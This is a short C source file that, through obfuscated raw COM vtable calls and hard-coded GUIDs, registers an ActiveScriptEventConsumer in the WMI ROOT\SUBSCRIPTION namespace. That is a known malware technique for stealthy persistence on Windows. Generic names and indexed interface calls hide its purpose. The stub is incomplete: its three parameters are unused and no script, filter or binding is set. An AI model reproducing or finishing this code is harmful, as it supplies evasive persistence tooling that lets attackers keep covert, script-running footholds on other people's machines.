#include <windows.h>
#include <wbemidl.h>

void __attribute__((noinline)) __attribute__((used)) routine_v2(const char* n, const char* q, const char* s){
    void* l = NULL;
    void* sv = NULL;

    CoInitializeEx(0, 0);

    GUID cl = { 0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };
    GUID it = { 0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };

    CoCreateInstance(&cl, 0, 1, &it, &l);

    ((HRESULT (__stdcall *)(IWbemLocator*, BSTR, BSTR, BSTR, BSTR, LONG, BSTR, IWbemContext*, IWbemServices**))
        (*(void***)l)[3])(
            (IWbemLocator*)l,
            SysAllocString(L"ROOT\\SUBSCRIPTION"),
            0, 0, 0, 0, 0, 0,
            (IWbemServices**)&sv
    );

    IWbemClassObject* c = NULL;
    IWbemClassObject* i = NULL;

    ((HRESULT (__stdcall *)(IWbemServices*, BSTR, LONG, IWbemContext*, IWbemClassObject**, IWbemCallResult**))
        (*(void***)sv)[6])(
            (IWbemServices*)sv,
            SysAllocString(L"ActiveScriptEventConsumer"),
            0,
            0,
            &c,
            0
    );

    ((HRESULT (__stdcall *)(IWbemClassObject*, LONG, IWbemClassObject**))
        (*(void***)c)[14])(
            c,
            0,
            &i
    );

    VARIANT v;
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(L"C");

    ((HRESULT (__stdcall *)(IWbemClassObject*, LPCWSTR, LONG, VARIANT*, CIMTYPE))
        (*(void***)i)[15])(
            i,
            L"Name",
            0,
            &v,
            0
    );

    ((HRESULT (__stdcall *)(IWbemServices*, IWbemClassObject*, LONG, IWbemContext*, IWbemCallResult**))
        (*(void***)sv)[13])(
            (IWbemServices*)sv,
            i,
            3,
            0,
            0
    );
}